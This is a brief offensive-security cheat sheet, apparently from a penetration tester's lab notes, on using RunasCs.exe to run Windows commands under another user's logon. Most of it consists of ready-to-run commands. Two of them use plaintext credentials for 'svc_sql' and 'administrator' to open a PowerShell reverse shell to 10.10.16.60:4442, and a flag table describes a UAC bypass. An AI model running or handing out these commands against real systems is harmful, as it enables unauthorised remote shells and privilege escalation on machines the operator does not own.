
Some tools in windows doesn't accept getting executed from remote host, so we sometimes need to use RunasCs to make the computer thinks we are in local context.
```powershell
.\RunasCs.exe x x "qwinsta" -l 9   # use x x if you want to run the command using the current user context, YOU SHOULD PUT LOGON TYPE 9
```

```powershell
.\RunasCs.exe svc_sql 'P@ssw0rd1!' powershell -l 5 -b -r 10.10.16.60:4442 # reverse_shell
```

>[!NOTE] RunasCs.exe
> RunasCs.exe needs the plain text of the password, it doesn't accept NTLM hash.

```
.\RunasCs.exe administrator 'StrongPassword1234!' powershell -l 5 -b -r 10.10.16.60:4442
```


| Flag | Descrtiption                                                                  |
| ---- | ----------------------------------------------------------------------------- |
| -b   | try a UAC bypass to spawn a process without token limitations (not filtered). |
